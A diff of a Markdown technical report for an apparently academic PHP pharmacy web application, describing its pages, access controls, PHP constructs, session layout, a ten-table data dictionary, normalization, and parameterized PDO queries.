+##### 1. `pages/login.php` (Authentication Portal)
+- **Route:** `index.php?page=login`
+- **Access Control:** Public (Guests). Authenticated users are automatically redirected to `catalog` (Customers) or `dashboard` (Staff/Admin).
+- **Core Features & Functions:**
+  - Secure identifier-based login accepting either `username` or `email`.
+  - Rate-limiting lockout notice display (`?timeout=1` or `?locked=1`).
+  - Hidden CSRF token inclusion (`csrf_token()`).
+  - Client-side validation with instant visual feedback.
+  - Quick-fill demo credentials accordion for academic evaluation (Admin, Staff, Customer).
+- **State Mutation:** Dispatches `POST actions.php?action=login`. Upon successful Bcrypt verification, executes `session_regenerate_id(true)` to prevent session fixation.
 
-```
-[Insert Screenshot 3: Interactive Point-of-Sale (POS) Billing Counter with Dynamic Calculations]
-Caption: Figure 3.3 — Point of Sale Billing Counter (pages/sales.php) with instant browser-calculated subtotals and discounts.
-```
+##### 2. `pages/register.php` (Customer Self-Registration)
+- **Route:** `index.php?page=register`
+- **Access Control:** Public (Guests).
+- **Core Features & Functions:**
+  - Account creation form with fields: Full Name, Username, Email Address, 11-digit Mobile Phone, Delivery Address, Password, and Password Confirmation.
+  - Client-side regex pattern checks for phone (`01[3-9]\d{8}`) and alphanumeric username (`[A-Za-z0-9_.-]{3,50}`).
+  - Password strength helper requiring a minimum of 8 characters.
+  - Server-side uniqueness verification against both `username` and `email` columns in `app_users`.
+- **State Mutation:** Dispatches `POST actions.php?action=register`, creating an enabled `CUSTOMER` user with Bcrypt-hashed password.
 
-```
-[Insert Screenshot 4: Executive Analytical Dashboard with Sales Channel Breakdown]
-Caption: Figure 3.4 — Unified Analytics Dashboard (pages/dashboard.php) illustrating POS vs. Online revenue splits and inventory health.
-```
+##### 3. `pages/dashboard.php` (Executive & Operations Analytics)
+- **Route:** `index.php?page=dashboard`
+- **Access Control:** Restricted to `STAFF` and `ADMIN` via `require_staff()`.
+- **Core Features & Functions:**
+  - Single-pass analytical KPI metric cards: Total Revenue, Today's Sales Volume, Active Pending Orders, Low Stock Alerts, and Expiring Drug Warnings.
+  - Sales Channel Revenue Split: Visual progress bar and percentage breakdown comparing Point-of-Sale (POS) counter revenue against Online Storefront revenue.
+  - Top-Selling Medicines Table: Ranks high-volume pharmaceuticals with generic name, category badge, units sold, and revenue generated.
+  - Critical Inventory Health Warnings: Highlights batches approaching expiry within 90 days or below `minimum_stock_level`.
+  - Quick Action Navigation: One-click buttons to Open POS Counter, Review Fulfillment Queue, Manage Inventory, and Open User Administration.
+
+##### 4. `pages/catalog.php` (Customer Storefront)
+- **Route:** `index.php?page=catalog`
+- **Access Control:** Open to all users (Guests, Customers, Staff, Admin).
+- **Core Features & Functions:**
+  - Dynamic pharmacological category filter tabs generated from `categories` table.
+  - Debounced live search input connected to `api/router.php?action=search` via Vanilla JS.
+  - Interactive medicine cards displaying brand name, generic name, category pill, dosage form icon, formatted retail price in BDT (`৳`), and stock status tokens.
+  - Regulated Drug Notice: High-contrast `Rx Required` badge for POM medicines.
+  - Direct "Add to Cart" button with quantity constraints (prevents adding out-of-stock items).
+
+##### 5. `pages/cart.php` (Shopping Cart & Integrated Checkout)
+- **Route:** `index.php?page=cart`
+- **Access Control:** Restricted strictly to `CUSTOMER` role. Staff/Admins are barred from order placement (`require_customer()`).
+- **Core Features & Functions:**
+  - Itemized cart table showing medicine details, unit price, quantity spinner controls with instant update buttons, line subtotals, and remove actions.
+  - Automatic physical stock clamping: Users cannot select a quantity exceeding current batch stock.
+  - Dynamic Financial Summary: Displays item Subtotal, Standard Delivery Fee (৳60, waived over ৳1000), and Net Grand Total.
+  - Single-Page Integrated Checkout Form: Captures recipient name, contact phone, delivery address, payment method (`COD` or `STORE_PICKUP`), and special delivery notes.
+  - Regulated Prescription Upload Handler: If any item in the cart has `prescription_required = 1`, the checkout dynamically displays an enforced file input accepting PDF, PNG, or JPEG formats (max 5 MB).
+
+##### 6. `pages/orders.php` (Dual-Role Fulfillment & Order History Queue)
+- **Route:** `index.php?page=orders`
+- **Access Control:** All authenticated users (`require_login()`).
+- **Core Features & Functions:**
+  - **Customer View:** Displays the logged-in patient's personal chronological order history with status badges, line-item counts, total amounts, and tracking links.
+  - **Staff/Admin View:** Displays the Master Dispensary Fulfillment Queue with multi-parameter filter tabs (`All`, `Pending`, `Processing`, `Ready`, `Completed`, `Cancelled`), payment status filters, and search by order number or customer phone.
+  - Batch Action Modals: Allows staff to update status across the progression chain (`PENDING` -> `CONFIRMED` -> `PROCESSING` -> `READY` -> `DISPATCHED` -> `COMPLETED`).
+
+##### 7. `pages/order_detail.php` (Operational Order Breakdown & Live Tracking)
+- **Route:** `index.php?page=order_detail&id={orderId}`
+- **Access Control:** Authenticated. Enforces strict IDOR ownership checks: Customers may only view their own orders; Staff/Admin may view any order.
+- **Core Features & Functions:**
+  - Visual Step-by-Step Status Tracker: 5-stage timeline showing progression from Order Placed to Delivery Completed.
+  - Line-Item Table: Itemized snapshot of medicines, batch numbers, quantities, unit prices, and line totals.
+  - Customer Information Panel: Delivery address, telephone, selected payment method, and payment status.
+  - Customer Self-Cancellation: Allows customers to cancel pending orders before processing begins, atomically restoring allocated inventory.
+  - Prescription Inspection Modal: Displays uploaded medical prescriptions inline (via `<img class="img-fluid">` for PNG/JPEG or `<iframe src="...">` for PDF) using authenticated streaming (`&view_rx=1`).
+  - Staff Prescription Verification: Form allowing pharmacists to approve or reject prescriptions with required clinical justification notes.
+
+##### 8. `pages/medicines.php` (Master Inventory & Batch Management)
+- **Route:** `index.php?page=medicines`
+- **Access Control:** Staff (Read-Only) and Admin (Full CRUD) via `require_staff()`.
+- **Core Features & Functions:**
+  - Three-tab interface: `Medicine Batches`, `Categories`, and `Suppliers`.
+  - Advanced Multi-Attribute Inventory Filter: Filter by category, dosage form (`TABLET`, `CAPSULE`, `SYRUP`, etc.), stock health (`In Stock`, `Low Stock`, `Out of Stock`), and expiry timeline (`Expired`, `Expiring in 30 Days`, `Expiring in 90 Days`).
+  - Add / Edit Medicine Formulation Modal: Comprehensive modal capturing 14 fields including batch number, purchase price, selling price, stock, minimum stock threshold, manufacturing/expiry dates, category, and supplier.
+  - Soft-Delete Status Toggle: One-click button to activate or deactivate medicine formulations without breaking historical sales records.
+  - Integrated Category & Supplier Management: Tables with add/edit/delete modal actions for pharmaceutical distributors and classifications.
+
+##### 9. `pages/sales.php` (Dispensary Point of Sale & Retail Ledger)
+- **Route:** `index.php?page=sales`
+- **Access Control:** Staff and Admin (`require_staff()`).
+- **Core Features & Functions:**
+  - **Tab 1: Interactive POS Counter Billing:**
+    - Live medicine selection dropdown displaying current available stock and retail unit price.
+    - Dynamic JavaScript line-item addition: Automatically calculates row subtotals, allows inline quantity adjustments, and enforces stock boundary limits.
+    - Financial Calculations: Instant computation of Gross Subtotal, Flat Discount in BDT, and Net Payable Total.
+    - Customer Info Capture: Optional walk-in customer name and mobile phone for digital invoicing.
+    - One-Click Transaction Finalization: Posts to `actions.php?action=sale_create`, executing atomic stock deduction via `InventoryService` and redirecting immediately to the printable tax invoice.
+  - **Tab 2: Historical Sales Ledger:**
+    - Comprehensive audit trail of all walk-in retail sales and fulfilled online orders.
+    - Displays Invoice Number, Sale Date/Time, Dispensing Pharmacist, Sales Channel (`POS` vs `ONLINE`), and Net Amount.
+    - Direct link to reprint any historical tax invoice.
+
+##### 10. `pages/invoice.php` (Printable Sales Tax Invoice)
+- **Route:** `index.php?page=invoice&id={saleId}`
+- **Access Control:** Authenticated. Customers can view invoices for their own orders; Staff/Admin can view all invoices.
+- **Core Features & Functions:**
+  - Professional, clean, printable invoice layout formatted with CSS `@media print` rules.
+  - Pharmacy Header: Organization name, clinic address, contact email, and telephone.
+  - Transaction Metadata: Unique invoice number, date/time timestamp, payment channel, and cashier name.
+  - Itemized Purchase Table: Medicine name, batch number, quantity, unit price, and line subtotal.
+  - Financial Summary: Subtotal, discount applied, shipping charges, and net grand total.
+  - Browser Print Trigger: "Print Invoice" button invoking `window.print()` with clean paper layout.
+
+##### 11. `pages/users.php` (Dedicated Staff & System User Management)
+- **Route:** `index.php?page=users`
+- **Access Control:** Strictly restricted to `ADMIN` role (`require_admin()`).
+- **Core Features & Functions:**
+  - Personnel KPI Metric Cards: Total Registered Accounts, Active Dispensary Staff (Pharmacists), System Administrators, and Registered Storefront Customers.
+  - User Directory Table: Displays User ID, User Profile (avatar, full name, username), Contact Info (email, phone), Role Badge (`ADMIN`, `STAFF`, `CUSTOMER`), Status Badge (`Active` / `Disabled`), Registration Date, and Action Controls.
+  - Add New User Modal (`#addUserModal`): Allows administrators to provision new accounts with custom roles (`STAFF`, `ADMIN`, `CUSTOMER`), pre-validating email, phone, and Bcrypt password.
+  - User Activation Toggle: One-click button to disable or enable accounts. Includes safety checks preventing self-lockout or disabling the last remaining administrator.
+  - Password Reset Modal (`#resetPasswordModal`): Allows administrators to reset credentials for any account with a new minimum 8-character password.
 
 ---
 
-#### 3.2 Utilization of PHP Language Constructs & Superglobals
-PharmaCare leverages modern PHP 8.1+ language constructs to ensure type safety, robust state management, and defensive execution:
+#### 3.3 Comprehensive Inventory of PHP Language Constructs & Superglobals
+PharmaCare demonstrates master-level utilization of modern PHP 8.1+ language constructs:
 
 ##### 1. Superglobals in Action:
-- `$_GET`: Used in [`index.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/index.php) and [`api/router.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/api/router.php) for safe, idempotent parameter extraction (e.g., `$_GET['page']`, `$_GET['action']`, `$_GET['keyword']`).
-- `$_POST`: Employed in [`actions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/actions.php) to capture state-mutating payloads securely behind CSRF validation.
+- `$_GET`: Used in `index.php` and `api/router.php` for safe, idempotent parameter extraction (`$_GET['page']`, `$_GET['action']`, `$_GET['id']`, `$_GET['keyword']`).
+- `$_POST`: Employed in `actions.php` to capture state-mutating payloads securely behind CSRF validation.
 - `$_SESSION`: Serves as the central repository for user authentication context (`$_SESSION['user_id']`, `$_SESSION['user']['role']`), transient flash notification messages (`$_SESSION['flash']`), and client-side shopping cart data (`$_SESSION['cart']`).
-- `$_FILES`: Handled in `Controller::store()` to inspect uploaded doctor prescription documents (`$_FILES['prescription']`) for size, extension, and temporary disk location.
+- `$_FILES`: Handled in `Controller::processPrescriptionUpload()` to inspect uploaded doctor prescription documents (`$_FILES['prescription']`) for size, MIME type, and temporary disk location.
 - `$_SERVER`: Utilized in `includes/functions.php` to enforce HTTP POST verification (`$_SERVER['REQUEST_METHOD'] === 'POST'`), evaluate SSL state (`$_SERVER['HTTPS']`), and inspect referer headers.
 
 ##### 2. Operators, Conditionals, and Loops:
@@ -301,21 +448,30 @@ PharmaCare leverages modern PHP 8.1+ language constructs to ensure type safety, 
   ```php
   $page = (string)($_GET['page'] ?? (user() && is_customer() ? 'catalog' : 'dashboard'));
   ```
-- **Pattern Matching (`match`)**: Replaces brittle `switch` blocks in `index.php` and `actions.php` with strict type checking and zero fallthrough risks:
+- **Null Coalescing Assignment (`??=`)**: Efficiently initializes default session structures:
+  ```php
+  $_SESSION['cart'] ??= [];
+  ```
+- **Pattern Matching (`match`)**: Replaces brittle `switch` blocks in `index.php`, `actions.php`, and `api/router.php` with strict type checking and zero fallthrough risks:
   ```php
   $fallback = match ($action) {
       'category_save', 'category_delete' => 'medicines&tab=categories',
+      'supplier_save', 'supplier_delete' => 'medicines&tab=suppliers',
+      'medicine_save', 'medicine_toggle' => 'medicines',
       'sale_create'                      => 'sales&tab=pos',
       'cart_add'                         => 'catalog',
       'order_create'                     => 'cart',
+      'user_create', 'user_toggle', 'user_reset_password' => 'users',
       default                            => 'dashboard'
   };
   ```
+- **Strict Typing (`declare(strict_types=1)`):** Enforced across every PHP file in the repository to prevent silent type coercion bugs.
 - **Defensive Iteration (`foreach`)**: Safely traverses multidimensional associative arrays while rendering tables in `pages/order_detail.php`:
   ```php
   <?php foreach ($items as $item): ?>
       <tr>
           <td><?= e($item['medicine_name']) ?></td>
+          <td><span class="badge bg-light text-dark border"><?= e($item['batch_number']) ?></span></td>
           <td class="text-end"><?= money($item['unit_price']) ?></td>
           <td class="text-center"><?= (int)$item['quantity'] ?></td>
           <td class="text-end fw-bold"><?= money($item['line_total']) ?></td>
@@ -325,7 +481,7 @@ PharmaCare leverages modern PHP 8.1+ language constructs to ensure type safety, 
 
 ---
 
-#### 3.3 State & Session Management Architecture
+#### 3.4 State & Session Management Architecture
 HTTP is inherently a stateless protocol; each request is executed independently without native awareness of prior interactions. PharmaCare bridges this using server-side session management configured in [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php).
 
 When a user visits PharmaCare, PHP generates a unique, 32-character hexadecimal token (e.g., `4f9b2d8c1e7a...`) transmitted to the browser as the `PHPSESSID` cookie. The browser automatically echoes this cookie on all subsequent requests. On the server, PHP associates this ID with a protected session file stored in the system’s temporary directory.
@@ -335,8 +491,8 @@ When a user visits PharmaCare, PHP generates a unique, 32-character hexadecimal 
 |                        SESSION MEMORY STRUCTURE ($_SESSION)                       |
 +-----------------------------------------------------------------------------------+
 |  $_SESSION['user_id']       = 3                                                   |
-|  $_SESSION['user']          = [ 'id' => 3, 'role' => 'CUSTOMER', ... ]            |
-|  $_SESSION['last_activity'] = 1762657800 (Unix Timestamp)                         |
+|  $_SESSION['user']          = [ 'id' => 3, 'full_name' => 'Demo', 'role' => 'CUSTOMER' ]
+|  $_SESSION['last_activity'] = 1762657800 (Unix Epoch Timestamp)                   |
 |  $_SESSION['_csrf']         = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca" |
 |  $_SESSION['cart']          = [                                                   |
 |       1 => [ 'id' => 1, 'name' => 'Napa 500mg', 'qty' => 2, 'price' => 2.50 ],    |
@@ -346,7 +502,7 @@ When a user visits PharmaCare, PHP generates a unique, 32-character hexadecimal 
 +-----------------------------------------------------------------------------------+
 ```
 
-##### Cart State Invariance:
+##### Cart State Invariance & Physical Stock Clamping:
 Shopping cart items are stored inside `$_SESSION['cart']` indexed by unique medicine ID. When a customer adds an item, `cart_add_item()` clamps the requested quantity against the maximum physical stock retrieved from the database, ensuring users cannot request 50 units when only 10 exist. Because the cart lives in the session, customers can navigate between the catalog, order history, and product details without losing their selections.
 
 ---
@@ -355,7 +511,168 @@ Shopping cart items are stored inside `$_SESSION['cart']` indexed by unique medi
 *(Mark Allocation: 5 Marks — CO2)*
 
 #### 4.1 Relational Database Normalization Analysis (1NF, 2NF, 3NF)
-The PharmaCare schema ([`database/pharmacare.sql`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/database/pharmacare.sql)) is composed of **10 normalized InnoDB tables**. The database design strictly adheres to the rules of Third Normal Form (3NF) to eliminate update, insertion, and deletion anomalies.
+The PharmaCare database schema ([`database/pharmacare.sql`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/database/pharmacare.sql)) is composed of **10 normalized InnoDB tables**. The database design strictly adheres to the mathematical rules of Third Normal Form (3NF) to eliminate update, insertion, and deletion anomalies.
+
+1. **First Normal Form (1NF) Compliance:**  
+   - Every column contains strictly atomic, indivisible values. For example, rather than storing comma-delimited medicine IDs inside an `orders` record, line items are extracted into a separate child entity: `order_items`.
+   - Each table possesses an explicit primary key (`id` with `AUTO_INCREMENT`).
+   - Repeating groups of attributes are eliminated across all entities.
+2. **Second Normal Form (2NF) Compliance:**  
+   - The schema satisfies 1NF and contains zero partial functional dependencies. In junction tables such as `order_items` and `sale_items`, all non-key attributes (`quantity`, `unit_price`, `line_total`) depend directly and fully on the surrogate primary key `id`.
+   - Medicine details (such as `generic_name` or `brand_name`) are not duplicated within transaction tables; only historical price snapshots and batch identifiers are preserved to guarantee audit compliance.
+3. **Third Normal Form (3NF) Compliance:**  
+   - The schema satisfies 2NF and contains zero transitive dependencies ($X \rightarrow Y$ and $Y \rightarrow Z$).
+   - In `medicines`, supplier attributes (`company_name`, `phone`, `address`) are not stored directly; instead, a foreign key `supplier_id` references the normalized `suppliers` table. Modifying a supplier's telephone number requires updating exactly one row in `suppliers`, completely eliminating update anomalies.
+   - Categorical classifications are decoupled into `categories`, preventing redundant string storage.
+
+---
+
+#### 4.2 Comprehensive Data Dictionary (All 10 Tables)
+
+##### Table 1: `app_users` (System Accounts & Authentication)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary surrogate identifier |
+| `full_name` | VARCHAR(100) | NO | | | User's legal name |
+| `username` | VARCHAR(50) | NO | | UNIQUE | Unique system login handle |
+| `email` | VARCHAR(100) | YES | NULL | UNIQUE | Unique email address |
+| `phone` | VARCHAR(30) | YES | NULL | | Contact telephone number |
+| `address` | TEXT | YES | NULL | | Physical residential address |
+| `password` | VARCHAR(255) | NO | | | Bcrypt password hash ($2y$12$) |
+| `role` | ENUM('ADMIN','STAFF','CUSTOMER') | NO | 'CUSTOMER' | | Role-based authorization level |
+| `enabled` | TINYINT(1) | NO | 1 | | Account active flag (0=disabled) |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Account registration timestamp |
+
+##### Table 2: `categories` (Pharmacological Classifications)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `name` | VARCHAR(50) | NO | | UNIQUE | Category name (e.g., Antibiotic) |
+| `description` | VARCHAR(255) | YES | NULL | | Description of therapeutic class |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Creation timestamp |
+
+##### Table 3: `suppliers` (Pharmaceutical Distributors)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `name` | VARCHAR(100) | NO | | | Representative contact name |
+| `company_name` | VARCHAR(120) | YES | NULL | | Company name (e.g., Square Pharma) |
+| `phone` | VARCHAR(30) | NO | | | Contact phone number |
+| `email` | VARCHAR(120) | YES | NULL | | Contact email address |
+| `address` | VARCHAR(255) | YES | NULL | | Corporate distributor address |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Creation timestamp |
+
+##### Table 4: `medicines` (Formulations & Inventory Batches)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `name` | VARCHAR(120) | NO | | INDEX | Trade brand name (e.g., Napa 500mg) |
+| `generic_name` | VARCHAR(120) | NO | | INDEX | Pharmacological generic name |
+| `brand_name` | VARCHAR(120) | YES | NULL | | Manufacturer brand name |
+| `batch_number` | VARCHAR(50) | NO | | UNIQUE | Manufacturing batch identifier |
+| `medicine_type` | ENUM('TABLET','CAPSULE','SYRUP','INJECTION','CREAM','DROP','INHALER','OTHER') | NO | 'TABLET' | | Dosage formulation |
+| `purchase_price` | DECIMAL(10,2) | NO | | | Wholesale procurement price in BDT |
+| `selling_price` | DECIMAL(10,2) | NO | | | Retail dispensing price in BDT |
+| `quantity` | INT | NO | 0 | | Physical stock units available |
+| `minimum_stock_level` | INT | NO | 10 | | Low-stock threshold trigger |
+| `manufacturing_date` | DATE | YES | NULL | | Manufacturing date |
+| `expiry_date` | DATE | NO | | INDEX | Expiration date for FEFO sorting |
+| `prescription_required` | TINYINT(1) | NO | 0 | | Flag for POM drugs (1=Rx required) |
+| `active` | TINYINT(1) | NO | 1 | | Soft deletion flag (0=deactivated) |
+| `category_id` | INT | NO | | FK | References `categories(id)` |
+| `supplier_id` | INT | NO | | FK | References `suppliers(id)` |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Creation timestamp |
+
+##### Table 5: `sales` (POS Retail Transactions & Online Bridge)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `invoice_number` | VARCHAR(50) | NO | | UNIQUE | Unique invoice code (e.g., INV-POS-...) |
+| `sale_date` | DATETIME | NO | CURRENT_TIMESTAMP | INDEX | Timestamp of transaction |
+| `customer_name` | VARCHAR(100) | YES | NULL | | Customer name |
+| `customer_phone` | VARCHAR(30) | YES | NULL | | Customer phone number |
+| `subtotal` | DECIMAL(10,2) | NO | | | Gross subtotal before discount |
+| `discount` | DECIMAL(10,2) | NO | 0.00 | | Promotional discount in BDT |
+| `total_amount` | DECIMAL(10,2) | NO | | | Net payable total |
+| `sold_by_id` | INT | NO | | FK | References cashier `app_users(id)` |
+| `channel` | VARCHAR(20) | NO | 'POS' | INDEX | Channel: 'POS' or 'ONLINE' |
+| `order_id` | INT | YES | NULL | INDEX | References `orders(id)` if online |
+
+##### Table 6: `sale_items` (Itemized Lines for Sales)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `sale_id` | INT | NO | | FK | References `sales(id)` ON DELETE CASCADE |
+| `medicine_id` | INT | NO | | FK | References `medicines(id)` |
+| `quantity` | INT | NO | | | Units dispensed |
+| `unit_price` | DECIMAL(10,2) | NO | | | Historical retail price snapshot |
+| `line_total` | DECIMAL(10,2) | NO | | | Computed row subtotal |
+
+##### Table 7: `orders` (Customer Online Orders)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `order_number` | VARCHAR(50) | NO | | UNIQUE | Formatted order code (ORD-...) |
+| `customer_id` | INT | NO | | FK | References buyer `app_users(id)` |
+| `customer_name` | VARCHAR(100) | NO | | | Recipient full name |
+| `customer_phone` | VARCHAR(30) | NO | | | Delivery contact phone |
+| `delivery_address` | TEXT | NO | | | Destination delivery address |
+| `subtotal` | DECIMAL(10,2) | NO | | | Cart items subtotal |
+| `shipping_fee` | DECIMAL(10,2) | NO | 0.00 | | Delivery charge in BDT |
+| `total_amount` | DECIMAL(10,2) | NO | | | Net grand total |
+| `order_status` | ENUM(...) | NO | 'PENDING' | INDEX | Lifecycle: PENDING, CONFIRMED, etc. |
+| `payment_method` | ENUM('COD','STORE_PICKUP') | NO | 'COD' | | Payment mode |
+| `payment_status` | ENUM('UNPAID','PAID') | NO | 'UNPAID' | | Payment settlement state |
+| `prescription_required` | TINYINT(1) | NO | 0 | | Indicates if order contains POM |
+| `prescription_status` | ENUM(...) | NO | 'NOT_REQUIRED' | | Status: PENDING_REVIEW, VERIFIED, etc. |
+| `notes` | TEXT | YES | NULL | | Special delivery instructions |
+| `stock_deducted` | TINYINT(1) | NO | 1 | | Stock allocation flag |
+| `stock_restored` | TINYINT(1) | NO | 0 | | Stock restoration flag upon cancel |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | INDEX | Order placement timestamp |
+| `updated_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Timestamp on update |
+
+##### Table 8: `order_items` (Itemized Lines for Online Orders)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `order_id` | INT | NO | | FK | References `orders(id)` ON DELETE CASCADE |
+| `medicine_id` | INT | NO | | FK | References `medicines(id)` |
+| `medicine_name` | VARCHAR(100) | NO | | | Snapshot of trade brand name |
+| `batch_number` | VARCHAR(50) | NO | | | Allocated batch number |
+| `quantity` | INT | NO | | | Units ordered |
+| `unit_price` | DECIMAL(10,2) | NO | | | Unit price snapshot |
+| `line_total` | DECIMAL(10,2) | NO | | | Computed total |
+
+##### Table 9: `order_status_history` (Audit Trail)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `order_id` | INT | NO | | FK | References `orders(id)` ON DELETE CASCADE |
+| `previous_status` | VARCHAR(30) | YES | NULL | | Prior status state |
+| `new_status` | VARCHAR(30) | NO | | | Updated status state |
+| `changed_by_id` | INT | NO | | FK | References actor `app_users(id)` |
+| `remarks` | TEXT | YES | NULL | | Audit justification notes |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Timestamp of transition |
+
+##### Table 10: `prescriptions` (Doctor Prescription Documents)
+| Column | Type | Nullable | Default | Key | Description |
+| :--- | :--- | :---: | :---: | :---: | :--- |
+| `id` | INT | NO | AUTO_INCREMENT | PK | Primary identifier |
+| `order_id` | INT | NO | | FK | References `orders(id)` ON DELETE CASCADE |
+| `customer_id` | INT | NO | | FK | References patient `app_users(id)` |
+| `file_path` | VARCHAR(255) | NO | | | Internal storage path |
+| `original_filename`| VARCHAR(255) | NO | | | Client-supplied file name |
+| `file_size` | INT | NO | | | File size in bytes |
+| `mime_type` | VARCHAR(100) | NO | | | Detected MIME (e.g., image/png) |
+| `verification_status`| ENUM('PENDING','APPROVED','REJECTED') | NO | 'PENDING' | INDEX | Clinical verification status |
+| `reviewed_by_id` | INT | YES | NULL | FK | References pharmacist `app_users(id)` |
+| `review_notes` | TEXT | YES | NULL | | Pharmacist clinical notes |
+| `reviewed_at` | DATETIME | YES | NULL | | Timestamp of review |
+| `created_at` | DATETIME | NO | CURRENT_TIMESTAMP | | Upload timestamp |
+
+---
+
+#### 4.3 Entity-Relationship Diagram (ERD)
 
 ```mermaid
 erDiagram
@@ -466,34 +783,12 @@ erDiagram
     }
 ```
 
-##### Detailed Normalization Justification:
-1. **First Normal Form (1NF):**  
-   - Every column contains strictly atomic, indivisible values. For example, rather than storing comma-delimited medicine IDs inside an `orders` record, line items are extracted into a separate child entity: `order_items`.
-   - Each table possesses an explicit primary key (`id` with `AUTO_INCREMENT`).
-   - Repeating groups of attributes are eliminated across all entities.
-2. **Second Normal Form (2NF):**  
-   - The schema satisfies 1NF and contains zero partial functional dependencies. In junction tables such as `order_items` and `sale_items`, all non-key attributes (`quantity`, `unit_price`, `line_total`) depend directly and fully on the surrogate primary key `id`.
-   - Medicine details (such as `generic_name` or `brand_name`) are not duplicated within transaction tables; only historical price snapshots and batch identifiers are preserved to guarantee audit compliance.
-3. **Third Normal Form (3NF):**  
-   - The schema satisfies 2NF and contains zero transitive dependencies ($X \rightarrow Y$ and $Y \rightarrow Z$).
-   - In `medicines`, supplier attributes (`company_name`, `phone`, `address`) are not stored directly; instead, a foreign key `supplier_id` references the normalized `suppliers` table. Modifying a supplier's telephone number requires updating exactly one row in `suppliers`, completely eliminating update anomalies.
-   - Categorical classifications are decoupled into `categories`, preventing redundant string storage.
-
-##### Foreign Key Constraints & Indexing Strategy:
-- **Referential Integrity:**  
-  Parent lookups enforce `ON DELETE RESTRICT` (e.g., attempting to delete a category or supplier that is linked to active medicines is blocked at the database engine level, throwing PDO error code 1451). Conversely, subordinate line items (`order_items`, `sale_items`, `order_status_history`) enforce `ON DELETE CASCADE` to maintain referential hygiene if a draft order is purged.
-- **B-Tree Indexing Optimization:**  
-  Secondary B-Tree indexes are explicitly defined on high-frequency search and filter columns:
-  - `medicines(name, generic_name)`: Optimizes catalog search queries.
-  - `medicines(expiry_date)`: Optimizes FEFO batch sorting and dashboard expiry alerts.
-  - `orders(customer_id, order_status, created_at)`: Eliminates full table scans during customer order lookups and staff fulfillment queue filtering.
-
 ---
 
-#### 4.2 Full CRUD Implementation with Parameterized PDO Statements
-To prevent SQL injection vulnerabilities, all database communication is routed through native PDO prepared statements with disabled emulation (`PDO::ATTR_EMULATE_PREPARES => false`).
+#### 4.4 Secure PDO CRUD Implementation with Parameterized Statements
+All database operations in PharmaCare are executed via native PHP Data Objects (PDO) with parameter binding, completely preventing SQL injection vulnerabilities.
 
-##### Entity 1: `medicines` (Master Inventory CRUD)
+##### Entity: `medicines` (Master Inventory CRUD)
 ```php
 // CREATE: Inserting a new medicine formulation
 $stmt = db()->prepare(
@@ -508,7 +803,7 @@ $stmt->execute([
     $mfgDate, $expDate, $rxRequired, $categoryId, $supplierId
 ]);
 
-// READ: Filterable inventory search with bound parameters
+// READ: Multi-factor filterable catalog query with bound parameters
 $sql = 'SELECT m.*, c.name AS category_name, s.name AS supplier_name 
         FROM medicines m 
         JOIN categories c ON c.id = m.category_id 
@@ -519,66 +814,54 @@ $stmt = db()->prepare($sql);
 $stmt->execute([$categoryId, '%' . $keyword . '%']);
 $medicines = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
-// UPDATE: Atomic stock deduction with pessimistic concurrency row lock
-$pdo->beginTransaction();
-$lockStmt = $pdo->prepare('SELECT id, quantity, selling_price FROM medicines WHERE id = ? FOR UPDATE');
-$lockStmt->execute([$medicineId]);
-$batch = $lockStmt->fetch(PDO::FETCH_ASSOC);
-
-if (!$batch || $batch['quantity'] < $deductQty) {
-    throw new DomainException('Insufficient stock units available.');
-}
-
-$updateStmt = $pdo->prepare('UPDATE medicines SET quantity = quantity - ? WHERE id = ?');
-$updateStmt->execute([$deductQty, $medicineId]);
-$pdo->commit();
-
-// DELETE: Safe soft-deletion (status deactivation)
+// UPDATE: Soft deletion / status deactivation toggle
 $stmt = db()->prepare('UPDATE medicines SET active = ? WHERE id = ?');
 $stmt->execute([(int)!$currentActiveStatus, $medicineId]);
 ```
 
-##### Entity 2: `orders` (Online Medicine Order Placement & State Machine)
+---
+
+#### 4.5 Pessimistic Concurrency Locking & Atomic Stock Control Engine
+A major risk in pharmacy applications is stock overselling due to race conditions (e.g., when a walk-in POS customer and an online customer attempt to buy the last 5 units of an antibiotic simultaneously).
+
